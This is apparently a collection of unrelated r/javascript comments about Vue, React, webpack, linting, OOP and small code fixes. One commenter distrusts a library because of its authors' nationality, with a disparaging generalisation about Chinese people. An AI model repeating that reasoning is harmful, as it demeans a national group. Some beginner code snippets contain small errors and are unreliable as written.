Crossposting my comment from the r/programming crosspost: --- This a pretty good guide; certainly makes the point that JS setups don't need to be incredibly arcane. One mistake, as far as I can tell, though: they have "pre-commit" in their `package.json`, but that doesn't do anything on its own; you need to do `npm i --save-dev pre-commit`, first, and I don't see that anywhere in the guide. Though "pre-push" is my preferred flavor: I hate waiting 10-30 seconds on every commit, I just want to know that it works before I share it with anyone else. (But then I commit often and am not afraid to rewrite commit history. YMMV) --- The only other change, is I'd really recommend `eslint` over `standard`. Yes, it requires a bit of config in your package.json: "eslintConfig": { "extends": "eslint:recommended" } But I find `standard` is both annoyingly opinionated, with some controversial opinions, (no semi-colons is the huge controversial choice here) and completely inflexible about those opinions; while "eslint:recommended" gives you a very uncontroversial baseline, while still being entirely customizable and extendable, if you so desire.
More precisely, it drops NaNs: &gt; [NaN, NaN, NaN, 'batman'].filter((v, i, a) =&gt; a.indexOf(v) === i) ["batman"] This is fine with me. But it's true that this is an implementation quirk, which probably shouldn't be there. If this were a library, this would be clearly a bug.
RemindMe! 15 hours
Very nice
Yep. Useful when integrating Amazon API into some ecommerce site. I've had to do it three times in the last 8 months so I thought someone else would run into this situation too :D
I ended up finding an integrated system YT uses for the public.
Yes. how is this even a question? people have *a lot* more trouble visualizing all the procedures of deploying their code than they realize and they write vague useless documentation as a result. Videos force you to go through every step sequentially. 
I'm not certain. There may be a unicode translation issue with JavaScript. I'll check it out.
Your html is all fucked up. You want a body tag in there
I'd be up for that! Not sure how much I could add, but I'm super eager to learn and happy to help where I can. 
&gt; Let's say today I write code and I'm careful not to use any names on Object.prototype. But what if the new ES specs for 2017, 2018, 2019, etc., add new stuff to Object.prototype. Now there might be a conflict that I couldn't have avoided because it didn't exist when I wrote the code. Due to magic meta-properties like `__proto__`, this same argument applies for "keys" that may be introduced to objects *without* a prototype. Objects are not a safe alternative to `Map`, no matter what precautions you take. [See my other comment.](https://www.reddit.com/r/javascript/comments/5e62us/is_there_a_reason_to_create_an_object_without_a/dabfpb2/)
Started YDKJS last week. Trying to work through that book to help prepare myself to learn Frameworks. Would be interested in a YDKJS study group for sure.
Hi /u/dreamache, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index) (specifically, _Posting: Showing off a Project_). Please use the [Showoff Saturday](https://www.reddit.com/r/javascript/search?sort=new&amp;restrict_sr=on&amp;q=flair%3AShowoff%2BSaturday) posts for these types of submissions.
Would you recommend it as begginer-friendly ?
Chrome, which I believe it is valid for. 
Damn, might take longer than I expected. Life is hard :( Reddit will close this thread. But if I ever get it done, I'll message you. 
Without knowing what the element is, I'm not sure if classList is valid. May want to debug and see what the element is to determine if that DOM element can have a classList or not.
Web migrated from React to Riot, our app size decreased by 60%. It also has a cleaner approach in writing code. No more weird JSX
Sorry what you mean? Im using the public API for Amazon Autocomplete. Take a look at this where the script tag is injected (the whole thing it's based on jsonp). https://github.com/caroso1222/amazon-autocomplete/blob/master/src/amazon-autocomplete.js#L311
It extends the packaged jquery which is imported by default
Why on Earth is it zero based?
Hmm. OK, well thank you for the suggestion. 
If you come across an element without any classes it is going to return undefined for the classList which in turn will break the rest of your javascript for the page if you try to call a method on it. Also move the child node checker outside of the initial if statement. Otherwise unless every parent element has the class you're looking for, it won't find the correct children. if(element.classList &amp;&amp; element.classList.contains(className){ arr.push(element); } if (element.hasChildNodes(){ your for loop code here } EDIT: It doesn't even need to be an else if, just 2 if statements in a row will accomplish what you need.
Related: https://esdiscuss.org/topic/object-equals-and-object-clone
You can accomplish what you want with pure vanilla javascript. Remember that AngularJS and jQuery are both built with vanilla javascript. That said, if you're a noob (which i suspect you are), go ahead and use jquery. Angular is going to be a lot for you to digest if you want to actually understand what you're doing. http://api.jquery.com/jquery.ajax/
Sounds awesome. I'm trying to make the move from being a teacher to being a developer. Hey, if you can hey me learn more JS we can help you be less mic shy! :)
Better than if he used the Pornhub API. 
Really really weird picks for tooling. I would feel super uncomfortable building anything even mildly serious based around projects with such small support communities. Ava at least looks like it might go somewhere (still a risky pick IMO), but Chokidar doesn't really even seem like it's on the radar...
I did borrow the examples from Jeff and [Avik](https://youtu.be/M8x0bc81smU)'s talks on Flow. Aside from that, the talk is completely original so I don't think that comment is *completely* fair 😞 -- I do agree that I should have given given proper acknowledgment, though. 
I agree that I should have given credit. Thanks for the kind words, though.
Closer to react than angular. 
Im mostly a noob but i would love to be part of something like this
Came here to say use an object literal or a switch rather than that if / else spaghetti. Also, you might as well allow the user to select the items with a click rather than entering a number.
You should also move the nested new if(element.children().length) outside the if(element.classList.contains(className)).. no?
Awesome!
I thought that was the issue but since I created a variable for the length at the beginning of the function and used that in the for-loop, doesn't that eliminate this problem? My array has 11 elements, so `menuLength` == 11. Wouldn't it stay 11 until it exits the for-loop?
&gt; Less code is not always better. Agreed. &gt; ...code like this, that contains quite some implicit knowledge and assumptions: Disagreed. It's right there in the component! Not all abstractions are magic, and not all verbosity is DRY. I think this is a typical abstraction any developer should be used to seeing. &gt; ..add to the smarty pants by introducing another check.. Yeah I'll buy that. I personally don't do a ton of forms, but if I did I'm sure I would write myself (or use an existing) form abstraction that makes building forms with various input types easy, and that has a nice API. Writing handlers for *every* input is far too tedious to be considered good practice. That being said, I have been writing forms, though I use neither `value` nor `ref`. Just `onChange` and `defaultValue` and it's been working fairly well for me so far. I'll defer to form experts when I have more complexity to handle. 
X-Post referenced from [/r/rocketleague](http://np.reddit.com/r/rocketleague) by /u/Ironturtle19 [2D Rocket League "game" I Created!](http://np.reddit.com/r/RocketLeague/comments/5edmjq/2d_rocket_league_game_i_created/) ***** ^^I ^^am ^^a ^^bot. ^^I ^^delete ^^my ^^negative ^^comments. ^^[Contact](https://www.reddit.com/message/compose/?to=OriginalPostSearcher) ^^| ^^[Code](https://github.com/papernotes/Reddit-OriginalPostSearcher) ^^| ^^[FAQ](https://github.com/papernotes/Reddit-OriginalPostSearcher#faq)
This is something that took a while for me to make, I understand it's very bare bones, but for someone who just started working with Js I'm really interested to see the communities feedback as I'm very proud of it. Thanks for playing! permalink (ive been learning Js on Khan academy for about a week or two now.)
Not sure of the original design decision but it does mean you can do something like this for formatting: ["Jan","Feb","Mar",...][date.getMonth()] But honestly there are so many inconsistencies and locale dependent cases in JS that I highly recommend using a library such as [Moment.js](http://momentjs.com/) if you are going to do anything more comlicated than just the basics. Especially true if working with multiple timezones, which on the internet you almost always are.
your return statements are both in the forEach iterator, the outer function has no return, try this: function positionOddNumber(numbers){ let result = false; numbers.split(' ').map(Number).forEach(function (value, index, array) { if(value % 2 === 1) { result = ++index; } }) return result; }; 
A) positionOddNumber has no return B) .forEach always returns undefined Instead you should create a variable above your chain and set that equal to index+1 and return that variable from your positionOddNumber function. function positionOddNumber(arr) { var rtn = -1; arr.split(' ').map(Number).forEach(function(v,i) { if(v%2 === 1) { rtn = index + 1; return rtn; } return false; }); return rtn; } EDIT: Just formatting.
wot
Can you upload the js file and/or the binary it downloads to virustotal.com and then provide the link to the analysis? Many of the js files being delivered via email are droppers for Ransomware. Did you see what process spiked the cpu to 99%?
I think he means is the API publically documented? i.e. is its use encouraged for developers and therefore unlikely to change.
Ok guys, after seeing how many people are interested in being part of the study group, I decided to make a slack. I will need your email adresses in order to invite you.
You're totally right. That's the main goal of using the affiliates API so as you say they may not even care.
Got it. So as for the plugin public API, it is documented in the repo. If you're talking about the endpoint I'm using to fetch the data from Amazon, it's not documented anywhere, I had to check the network log via chrome dev tools on Amazon.com. It's a pretty mundane JSON and perhaps likely to change.
Are you always this negative? Vue borrows a lot of features from other libraries/frameworks. If you haven't already, have a quick read of this https://vuejs.org/v2/guide/comparison.html It'll explain what your seeing.
I *want* to like Vue, and there is so much to like over Angular (1.x or 2.x), but two way data binding introduces far more problems than it solves (1) and overloading html with extra syntax really doesn't sit well with me (2) At least (2) can be solved with JSX templates.
&gt;It's not like for builds on top of while in any meaningful way. But it does! `while(x)` is equivalent to `for(;x;)`. The initial and post-iteration expressions are optional.
so that makes while more "basic"? lol okay then
Thanks!
It doesn't have two way binding. It was opt in for 1.x and is not present in 2.x For whatever reason I really like the .vue file stuff so I haven't messed with vue+jsx yet 
v-bind &lt;-- will give you 2 way data binding. It's an anti pattern and you will [forget I mentioned it](http://giphy.com/gifs/80s-vintage-1989-LStkLxWFxgAoM). [Edit] `v-model`! That's what I meant. I'm still new to it. Thanks Evan for checking in, ;) [Here](https://vuejs.org/v2/guide/forms.html)'s a link to that. &gt; You can use the v-model directive to create two-way data bindings on form input and textarea elements. It automatically picks the correct way to update the element based on the input type. Although a bit magical, v-model is essentially syntax sugar for updating data on user input events, plus special care for some edge cases.
I think that was my issue. Thanks a lot!
In me experience when people talk about the two way binding and why it's problematic they are taking about child components implicitly producing side effects in parent components scope, which can't happen in vue 2.0 and was achieved in 1.x using .sync Now you have to explicitly emit events or use something like vuex/redux/etc 
Honestly, I wish we could have `let` as the "const" assignment, and `var` as the "variable" assignment. I'm a bit sad that ship has sailed in JS. A lot of the arguments against `const` seem to be that it's unfortunately named.
nope, v-bind is one way. (I'm the author of Vue)
I've never seen anyone except the W3C use the terms HTML 5.1 or 5.2. The vast majority of the time it's just "HTML" or "HTML 5". The standard is in constant development with some sections being more complete than others. Note that the W3C is also no longer the authorities source of the standard, the WHATWG is. The W3C periodically takes a snapshot of the standard and published it as a recommendation but as far as I can tell these recommendations are largely ignored.
Load Notepad. Or install Notepad++ if you want to get "fancy". Load the browser of your choice. Install Node if you need a server component. But you probably don't, at least not immediately, so skip that for now. Congratulations! Your Javascript development environment is set up. Now get your ass to work! (seriously, stop making his crap so damned complicated, that's the point)
Now all they need is to improve benchmarks and their comparison page to include angular 2 and vuejs and they will be good to go.
Wait, pornhub has an API?
I prefer semistandard ...and use neither. Their biggest benefit of no configuration is the cause of their biggest problems i.e. *you can't override their config even if you have very[good reasons](https://github.com/feross/standard/issues/240)*
`standard` currently holds the first place in my personal list of most obnoxiously named js modules, specifically because of the semicolons. (`css` is the second place)
Hi flet, say what are your opinions on [this issue](https://github.com/feross/standard/issues/240). 
Search engines just link to the manuals.
[Here's the analysis.](https://virustotal.com/en/file/3fcdbbfff45e6b62c2fa0badb9f9e722031f3c97a387b088a07d3914512bfbf1/analysis/) It was a combination of Powershell and Anti Malware Service Executable. [Here's a link to the original file.](http://pastebin.com/iv132s8r)
I updated vue, but get this message in my terminal: `UNMET PEER DEPENDENCY vue-template-compiler@^2.0.0` What exact am I supposed to do here? In the linked docs it says: *vue-template-compiler is now a peer dependency instead of a direct dependency.* Do I need to install `vue-template-compiler` separately? 
Hi /u/arjun_m3, this sub is for javascript, which despite the similar name, is much different than java. Also, if you have a specific javascript (not java) question and have already attempted to answer it, then we're more than glad to help, but we're not going to do your homework for you.
Can anyone recommend a good Auth solution to go with their Vue-CLI webpack boilerplate? I've been working on getting it done, but most of the resources I've found are for Vue.js 1x. 
Meh, I think TypeScript is still miles ahead in terms of development tooling and community
Or even better, since the point seems to be to **find** the index where the value satisfies a condition... const result = numbers.split(' ').map(Number).findIndex(function (value, index, array) { return value % 2 === 1; });
Just having a read through the "Get started" section of the docs and I'm completely blown away by how simple this is. 
I was actually reading [JavaScript Patterns](https://www.amazon.com/JavaScript-Patterns-Better-Applications-Coding/dp/0596806752) before vither999 recommended the book he did. So i'll definitely check out the book you're suggesting too! Thanks!
That is __the__ book for design patterns. It's still very much relevant, and an excellent introduction to how to talk about OOP. If you're getting started in the industry most of those patterns are standard enough that everyone knows them and is familiar with them. That said - it's a general design patterns book. It existed before JS and the patterns aren't specific to any language - just good design. Following up with additional literature specific to JS is a good idea.
I want to empower you. I know you can do it. Go to any webpage (like https://www.reddit.com/), open the developer console (F12 / cmd-opt-i) and type: document.body.innerHTML = '' Now you have a blank slate. Let's make a web app right from the console. First we'll make an input box (which will appear in the top left corner): document.body.innerHTML = '&lt;input type="text" placeholder="type here!" /&gt;' Cool! Now let’s call a function whenever the value of the input box changes. First we'll save a local copy of the element: let inputBox = document.querySelector('input') Then we'll attach an event handler to fire when we type: inputBox.oninput = event =&gt; console.log(event.target.value) Try typing into the input box. We should get some feedback into the console. Nice! Let’s do something useful with that. Did you know that reddit exposes a json api? Just tack `.json` at the end of a subreddit! Try it! https://www.reddit.com/r/aww.json `r/aww` is an awesome sub, but the url is a little different when you search for something. Might look a little like `https://www.reddit.com/r/aww/search.json?q=lizards&amp;restrict_sr=on` Let’s use the browser’s built in ajax function `fetch` to get some reddit json data. inputBox.oninput = event =&gt; { fetch(`https://www.reddit.com/r/aww/search.json?q=${event.target.value}&amp;restrict_sr=on`) .then(response =&gt; response.json()) .then(json =&gt; console.log(json)) } If we type into the input box now, within a few seconds we should receive an object that you can expand to see its details: Object {kind: "Listing", data: Object} Click on the right arrow to take a look at what we've got! If everything worked out, you should see: Object data: Object children: Array[&lt;some number&gt;] Each item in `children` also has a `data` object that has information about the reddit post. Let's loop through `data.children` and access each item's `data.thumbnail` to display cute images: inputBox.oninput = event =&gt; { fetch(`https://www.reddit.com/r/aww/search.json?q=${event.target.value}&amp;restrict_sr=on`) .then(response =&gt; response.json()) .then(json =&gt; { json.data.children.forEach(child =&gt; { let img = document.createElement('img') img.src = child.data.thumbnail document.body.appendChild(img) }) }) } Now use your search input box to find cute cats (or whatever you think is "aww" worthy)! Should see something like this: http://i.imgur.com/ps9GgdA.jpg :) So what was the point of this? Well.. JavaScript is awesome &amp; powerful, despite any design patterns or computer science topics you will encounter. So much of what we do is: * handle user input (or other events) (typing, talking, gesturing, weather changes) * request data / send data to servers! * provide a user experience (display data / create noise / vibrate / (smell-o-vision ?) ) It doesn't take much to create experiences, so my advice is to go forth and provide! As long as you're passionate about your craft you will pick up the science along the way. edit addendum: I have tons of examples like this. Creating canvas animations, making synthesizers, hooking into sockets for multiplayer gameplay. All from the browser console. Learn to do "stuff" / make things, and along the way you'll discover and learn about patterns.
For those who want to try it, but don't want to spend few days on configuring Webpack and understanding how vue-loader works, try [vbuild](https://github.com/egoist/vbuild). It's super simple, no configuration required. Just one command.
Honestly I'm still figuring out exactly what web pack does 
any recommendations for a Map polyfill?
https://webpack.js.org/
Looks fun. Minimal is the way forward. 
`v-model` is not a binding per se. It's a directive. A small convenience in case you don't want to set up Vuex or handle the `input` event in your small one-page script. People with Angular background may appreciate it.
You'd probably run into tons of weird issues if you enabled case sensitivity on Windows. Not sure if you could even do that.
* Many JS code bases start off as just some random JS functions, and then they grow organically. * Many JS code bases are started, grown and maintained by people who are not primarily software engineers. * No one likes refactoring a JS code base. The risk is often too high, so companies avoid doing it. * Before ES6 is wasn't obvious how to do classes or modules. You had to make quite an effort to organise your code. * May devs think that JS is a toy or bad language, and therefore don't make any effort to write clean code. * May devs think that the JS part of their app is just some random support code which doesn't need much thought or structure. 
There is nothing wrong with it. You just wouldn't get all the nice tools provided by the JS ecosystem. I mean, hot reload, transpiling, single file components etc. vbuild allows you to start writing your code like a pro without being a pro.
Great, thanks for that.
No, it won't because "the Object.assign() method is used to copy the values of all enumerable own properties" from [MDN Docs](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Object/assign), the important part being "enumerable own properties", which prototype is not.
Check out [SpeakJS Discord](https://discord.gg/RnWqJTA)
&gt; OOP is standard in the industry. It's used to reason about large codebases and to abstractly discuss and talk about the program. In JS it tends to be a bit different **Some context is in order.** This is the standard in corporate software development because languages like Java, C#, and C++ are the standard in university computer science education and these university students are what prop up corporate software development. Outside the corporate world this isn't so much the case, particularly in the agency and start up worlds. In start ups you are free to do what ever is comfortable to the start up. The most popular languages in that kind of environment are Python and then JavaScript. Github is a ruby shop and Duckduckgo is a Perl shop. You would never see that in production software in the big corporate world. In the agency world you do what makes the most sense according to the industry you serve. In web agencies you actually have to know something about web technologies. If you attempt to push OOP too hard into JavaScript you might find yourself without a job. JavaScript is multi-paradigm and you will be too if you want to keep your job. In JavaScript inheritance is optional, and so OOP is optional. If you get stuck thinking JavaScript is a failure because it doesn't mandate OOP like Java you are going to have a really tough time when you have to manage or write absolutely any code outside of a massive monolithic framework. In corporate world you will probably be ok like this, but its going to be much harder to switch jobs. Personally, I absolutely avoid OOP in this language. This has not limited me from writing any large or small applications very quickly that perform well. The more you avoid OOP, though, the harder it is to feel comfortable in many of the massively popular frameworks. I have found that avoiding frameworks hasn't limited employment prospects in the corporate world, though it makes corporate developers very afraid of you. In the agency world it has actually proven helpful, because you can massively out perform people when it comes time for prototyping new tools and client mockups. It makes you look like a development rock star in agency world even if you really aren't, because you can work twice as fast due to fewer limitations and because there are fewer limitations you can try more creative approaches.
Promises and ES6 classes already are present in all modern browsers: https://kangax.github.io/compat-table/es6/#test-class Although I think classes don't change to much in OOP. It just syntax sugar. Actually I think that factory approach is more concise: https://jsfiddle.net/p3w3pbat/ (this is simple example, but I use this often in more complex code and it really makes better sense than verbosity of classes). 
I'm still learning myself but this seems right to me. The one thing I would suggest to anyone who is interested in getting started with vue and webpack is to use the vue-cli starting templates. https://github.com/vuejs-templates Webpack and webpack-simple are both fine choices. 
I don't think I'm missing anything here. The comment in question: &gt; It doesn't have two way binding. It was opt in for 1.x and is not present in 2.x The docs: &gt; You can use the v-model directive to create two-way data bindings
I would recommend you to stop reading now. I guess you've also watched a lot of YouTube confs and stuff. Ive been there. Just stop today. What I did to overcome most of what you talk about is to build open source packages. Just try that and look at someone's code. You will see that in no time you'll find yourself applying event delegation, prototype chaining, functional programming, promises (if you like to), unit testing, nodejs, es6 modules, perhaps using modules bundlers, etc. Se here are ideas for some libraries (don't use jQuery at all) you can choose one and start today: 1. I want a plugin that offers this behavior: whenever the user clicks on the search input, it makes a fancy animation to a full screen search. I don't want more that one instance (modules not oop - ydkjs talks about this pattern). I would also like a 60fps smooth animation (take a look at FLIP pattern to animate). Please don't pollute the global namespace with a bunch of variables, only expose the module name and document the public API (IIFE anyoneee?) 2. I'm tired of manually showing a loading icon in my buttons when the user executes an action. I want a plugin that let me just say something like `var myBtn = new LoadingButton(".my-btn")` and then I can activate or deactivate the loading state as such myBtn.activateLoading() or myBtn.deactivateLoading() Again, take a look a some others code. I've built a few of these guys so you can base your devs on that. I'm also noob so we're all in this constant learning stage. 😬 https://github.com/caroso1222 My 2 cents. 😊Good luck!! 
&gt; hundreds seriously, where did you get that impression? also, `small !== simple` Vue may have a couple more API methods to remember than react, but maybe what /u/syropian means is that those API methods provide benefits that make solving a specific problem easier/faster in Vue than in React.
I'm also new to webpack, but the most amazing thing for me is the development server. I have a custom bootstrap.scss file, on save webpack recompiles only what is necessary and refreshes the page automatically via websocket, without reloading it. Same when I edit a Vue component, a javascript file and it's all amazingly fast. And then there is all the other stuff webpack(2) does: tree shaking (removing code that the application does not use), packaging the application into asset files, babel/ES6 support, dynamic code loading etc.
It's not happening *now*, but that's not to say that something along similar lines may not emerge again later down the line.
Yeah, I'm still new to it, I mixed it up with `v-model`
Is that what you think OP was talking about when he said "two way data biding creates more problems than it solves"? 
I knew there was a better way but it was 1:30am when I answered this, cheers for sharing
https://vuejs.org/v2/guide/comparison.html
However - the argument over two-way binding has been around since way before components were a popular concept. Back in the day you had Backbone arguing against it, Knockout basing everything around it, and neither one dealing with components. So even today when someone argues that two way data binding is bad, I think it's still safe to assume they're not just thinking about parent-child or sibling component data flows.
Hey whaddya know, I *was* using map all over the place. I guess I got into a bad habit after all. Thanks for the pointer; feel free to point out any others you see :D EDIT: Fixed now: https://github.com/davestewart/javascript-state-machine/commit/5f2fb7b3b331458fbcd9db04163c8432c2271594
I remember feeling like this with respect to programming in general. The fact you are swimming in this confusion is (in my opinion) a good sign you are asking the questions necessary to learn and grow. One thing that might help is to understand that programming idioms, such as OO, functional, etc, are all techniques for writing code, and every programming language has some support for some set of idioms, not all programming languages support all idioms, and programming languages not explicitly supporting an idiom doesn't mean you can't use some part of that idiom to write code in that language, it just may require more or confusing syntax to accomplish. With respect to JavaScript it may help to understand that it does not provide inheritance the same way as other OO supporting languages (JavaScript uses prototypal inheritance, most other languages use a different type of inheritance), just FYI if you weren't aware. I'm not sure if this fact is part of what motivates people to say not to use the OO features of JavaScript, but if you want your code to take advantage of an engine's features, say you are writing JavaScript for a node.js program, then you won't be taking advantage of the V8 engine's optimization capabilities (according to google's JavaScript coding guide). When you talk about using frameworks, you're talking about a different thing. In my experience frameworks exist to eliminate "boilerplate" code, reduce unnecessary repetitive effort, or abstract away concerns that are common to a set of developers. Therefore knowing the intent of the framework and what it provides its users should be considered above the general programming techniques you are wondering about, because for all you know those techniques exist within the framework. Lastly, a good remedy for your confusion is more complete knowledge. Take all of the general rules you have heard and research them until you understand *why* people are giving the advise. In the world of JavaScript more than any other language community I have experienced, I have run in to very bad, unsubstantiated advice from people who didn't actually understand basic principles of formal systems (what things like math on paper and programming languages are). You may have good advise *in a particular context*, e.g., browser versus node.js, library code versus callback argument, etc. Or you may be dealing with someone telling you their opinions with zero factual justification. A lot of people see coding as an art and only care if the results get them what they want, and your goal may not be the same, so you need to verify as much as you can, especially in this community. Good luck!
It's very similar to React in the sense that they both use virtual doms, linear data flow, etc. The difference boils down to Vue.js being more opinionated, and shipping with a lot more official solutions under the auspices of the Vue.js org. For example, Vuex is Vue.js's version of Redux, but its built and distributed by the Vue.js org. The community isn't quite the size of React's, but it's a pretty neat technology and is very easy to pick up due to `vue-cli` and other options. 
Thanks a lot. That does help actually. As for why I am using it... Im in a fraternity and were working on some stuff for our chapters website. Whom ever set up the data before me used that array and im trying to figure it out so that I can modify it and even though I am the most web inclined in my chapter I am far from great so im sorta using this as a learning experience to teach my self. 
Web assembly could replace javascript, by making it possible to use other languages (like Java, C#, python) for web development
Looks pretty good. Thanks for sharing. Completely as a side note; Google (and others) are pushing for web components to fill the need for these type of wrappers. If you are bored/interested sometime you should check it out. [Google Spreadsheets polymer component](https://elements.polymer-project.org/elements/google-sheets). Plug for /r/PolymerJS 
cool! - http://imgur.com/a/8e3tT
I can understand where you are coming from, but since I wasn't really involved with these frameworks "back in the day" I don't know the specific arguments. My feeling is that "two-way binding" can mean a lot of things, and "it's always bad" seems to be an unjustified generalization if context is not taken into account.
I agree. Extend the [semi]standard config in ESLint and go from there.
I wrote a JSFiddle for this: https://jsfiddle.net/oztqfqwt/1/ NOTE: I did use jQuery but added comments so that you can see what is happening every step of the way.
If they think you're wrong after you've cited the official docs with a link and text, they need to respond with why they think you're wrong.
It's very cool. Remember there was something similar a while back that [evolved into Mona Lisa](http://alteredqualia.com/visualization/evolve/). I think this one is way more efficient.
Good job, but enjoy sueing
Then that is what I will do. Thank you so much!
If you want a router in Vue, you get VueRouter. If you want state management, you get VueX, etc. It is the same thing with React.
I disagree. The 2015 part of ES2015 doesn't help me as a developer since I still need to check individual features for support. As a result I look at it as just HTML or just JavaScript. This contrasts with Python where there is no partial support for the language in the standard distribution: you're using 3.5 or you're not.
Oh wow, that looks a lot better. Makes my original code look really unorganized. Thank you so much for all the input, I really appreciate it! 
Not sure why I was singled out, but I like that tip about package autocompletion
OO does not necessarily lead to modular code; OOP is just one design principle out of many. In my experience classes are overused with many developers conflating classes with OOP. It is fine, and even preferable, to have small classes with only a few necessary methods along with many free functions over classes with many methods some of which don't operate on class state directly. C++ has what I would consider a good use of classes when using OOP. JavaScript isn't strictly typed which means that fewer classes are necessary. The object primative and duck typing can fulfill many of the niches that classes are required to fill in other languages.
csjs is cool, but I feel like you sell yourself short by using strings. I think using objects for style is the way forward (stuff like glamor / aprhodite)
The udemy course also goes into javascript core concepts. 'Some basic JS' probably isn't enough to build an entire node app. Code along with him, pause the video, search terms, read the node documentation. Else you're not going to really grasp it and waste your time. It's very important to actually understand what the code you are writing is doing. Also, this takes time. Depending what you are trying to build, you may run into many issues that you won't know how to solve. Google everything. Read everything while not going do deep into the rabbit hole. Use this subreddit, stack overflow, etc.
Sick brah.
we have a solid 5-10 years of javascript being on top. compile-to-js languages actually *help* this because they provide multiple entry points to javascript itself. WASM is going to be huge for performance; it won't "kill" javascript, but it will open up huge new opportunities for non-JS devs. we're definitely going to see libraries target it, and it's likely we'll see frameworks target it as well.
Typescript alone neither will help nor prevent writing clean code. Some rules can be enforced by static analysis (pure JavaScript also has tools for it - e.g. ESLint) others will slip under the radar (so code review and human interaction is often needed to discuss some issues).
Hi /u/SangeetaGulia, the site `knoldus.com` has been banned for plagiarism. https://www.sitepoint.com/comparison-javascript-linting-tools/ 
I'm using TypeScript and initialized the project with the angular-cli.
Not overly friendly for people who need to make style edits to components who aren't familiar with JS object syntax, and any quirks that go along with that hybrid JS/CSS 
[removed]
i don't see a difference between the 2: http://imgur.com/a/tJI4s i don't have a screen of what I used to see :( 
Answer to this is here: http://stackoverflow.com/questions/40756335/my-local-mongodb-instance-is-not-saving-data-via-express-and-mongoose
All good dude. :) 
Better yet, play with some regular expressions and allow partial matches on the text. Better still, have three buttons rather than text entry.
Getting worried that the library has Chinese cooties? Really?
Very informative, nice work! One question, in the last example you did: ``` h|0 ``` What does the single pipe operator do?
The reason? Because we actually tried to use it once. What you appear to be seeing at your company is a false dichotomy between badly designed software and oop. There are, in fact, at least two other programming styles that are neither of those, some of which are very popular right now.
Is it intended to work on mobile? Didn't work for me on mobile 
Thank you!
I think it truncates any float, so that the function is always passed a whole number 
I think that koala.svg has landed is the deepest part of the uncanny valley that could exist. 
More precisely, it truncates by converting it to a 32-bit integer. So, it doesn't work for larger numbers. &gt; 12345678901234.5678 | 0 1942892530 &gt; Math.trunc(12345678901234.5678) 12345678901234 In Asm.js, it was used as an integer type annotation.
&gt; With React there is usually one API: render() and that's that. So JSX, `className` `ref`, `this.setState`, ` `shouldComponentUpdate`, and various lifecycle hooks are all not typically used in a React project? I think you compare apples to oranges. Sure, React *does* have a smaller API surface, but the difference is nog half as big as you make it out to be. Don't get me wrong, there's nothing wrong with prefering React, it's a truly great framework. But what you wrote above is just ranting.
design: awesome functionality/UX: what /u/saadq_ and others wrote, very much :)
You might look through the official templates: https://github.com/vuejs-templates/webpack-simple/tree/master/template You can use the vue-cli tool to install the templates for you. I usually just look through the settings to see how they've done it to get idea's for my own project. 
Just search how to use webpack and the "vue-loader" plugin
Will do! Thank you kind sir!
This would be better if I could click on a choice rather than type one in every time.
What's the difference?
In general, a less biased source would be nice. In particular, &gt; It reads more like English (e.g. for each item in items) &gt; Advanced versions of JavaScript are not required to increase readability Those are listed as pros, but they're misleading at best. Having javascript look like javascript is a good thing imo, and probably best for serious developers. Especially since they try to be HTML compatible. Also, they're misleading in that their code doesn't say for each items in item, it's &lt;li v-for="item in items"&gt; That is weird. First, it's not a for each or a for, it's a map. Second, what the fuck is v-for if you don't use vue? Saying it's more english-like and understandable is...problematic. Probably just a lie, misleading at best.
I never knew that calling drawImage with less than 9 arguments results in a performance impact. Being skeptical I ran up a benchmark and sure enough there is a very slight performance gain by using all 9 arguments. Crazy stuff!!
Modules and dependency injection are orthogonal: if you need dependency injection for testability or extensibility then use it. If not, importing modules is fine. Whether people use DI enough is a good question. My observation is that it is less well-known within this community when comparing to something like PHP.
Ok, I got to a proper computer and looked at the repo. Yes, depbot checks out the repo locally and then copies the files to the remote server, so the files are sent over the network twice. This approach is simpler than logging in to the remote machine and pulling the code from there, but is sub-optimal for users on poor networks (can you do a deploy using depbot if you're on your last 5 minutes of free wifi in a foreign airport?) or for repos with large binaries checked in. Can I "reuse" the code that already exists on my local machine? Another concern of mine is the deployment process itself. [This code](https://github.com/jacted/DeployerJS/blob/master/src/index.js#L231) will nuke my existing FTP files _first_ and attempt sending new files _later_ which as you can imagine can lead to all sort of hilarious fuckups. I would suggest using a temporary folder to upload files and checking for permissions _before_ deleting anything permanently. Also, an option to back up my existing FTP content comes in here rather nicely (hint: move directories). As far as I understand, the tool assumes a prompt-less local git setup. There is no way for me to connect to a private repo that asks me for a password. Is there a way to run a build script after checking the sources in? I personally don't check in my compiled binaries or transpiled ES5 bundles to the repo. Is there a way to run a shutdown script before deploying? A startup script after deploying? Without these options the scope of depbot is limited to deploying pet projects with static HTML files, not some serious usage. Adding some checks [here](https://github.com/jacted/DeployerJS/blob/master/src/index.js#L188) to prevent me from accidentally spilling out of the basedir would be nice. A [typo](https://github.com/jacted/DeployerJS/blob/master/src/index.js#L76). [FTP config](https://github.com/jacted/DeployerJS/blob/master/src/index.js#L36) format is not documented anywhere. [Config validation](https://github.com/jacted/DeployerJS/blob/master/src/index.js#L69) is... spartan. If you are doing config validation at all, why not go super-sayan on it? Check the port range, check that the path makes sense, etc. Why README.md is [prohibited](https://github.com/jacted/DeployerJS/blob/master/src/index.js#L134) from uploading but README is not, or any other file? How can I configure this as a user? Overall, it is unclear what is the intended scope of the depbot is. Is it a tiny tool for simple projects with very limited capabilities? Ok, state so in the repo and aim to get incredibly good at it. Are your ambitions bigger? Take a look at [existing projects](https://github.com/shipitjs/shipit) and try to match them.
Is there a desktop version of this that uses CUDA?
You're picking one sentence out of that long ass comparison to take issue with, and one that is of essentially no consequence, my point stands 
Of course there must be some weiredness in the syntax - it's a MV* framework in the end of the day. Also it's syntax is really easy to remember - for example in Angular 2 was hard to memorize all [] or () and when was the one when the other or let item of items ( why the fuck is this let and why of?). By all means there are reasons why so many devs likes Vue and these devs have surely tried both React or Angular.
Idk if I would call that progressive, pretty much every library has a way to use it with just script tags. Angular, React, etc.
I was being snarky, and maybe 'stable' meant 'bug free', not 'we're sticking with this API', but to announce your stability and then also mention you're working on a new (breaking) version seems contradictory to me. ...unless you're being sarcastic. In which case, carry on.
Since this article is about some seriously small micro-optimisations, what's the performance difference between truncating small numbers with the single pipe vs Math.trunc()? If you can reasonably expect a number to stay within the "small" range, is it worth using Math.trunc() even with the overhead of a function call?
chinese people are economically as far as possible from what we could call friend, excuse me if I want to protect myself
when web assembly will be released?
Just start writing your components and then use [vbuild](https://github.com/egoist/vbuild) to compile them. It's designed specifically for those who don't want to deal with Webpack directly.
